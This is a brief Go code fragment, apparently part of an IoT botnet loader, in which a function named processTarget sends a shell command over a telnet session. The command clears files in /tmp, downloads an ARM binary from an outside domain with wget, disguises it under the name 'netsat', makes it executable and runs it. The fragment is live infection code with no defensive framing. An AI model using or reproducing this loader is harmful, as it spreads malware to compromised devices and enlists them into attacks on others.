...
func processTarget(target string) {
	...
	new_telnet.Write([]byte("cd /tmp; rm -rf *.sh; rm -rf arm*; rm -rf netsat; wget http://femboytoastystaytoasty.com/skid.arm7; cat skid.arm7 > netsat; rm -rf skid.arm7; chmod +x netsat; chmod 777 netsat; ./netsat wnap\r\n"))
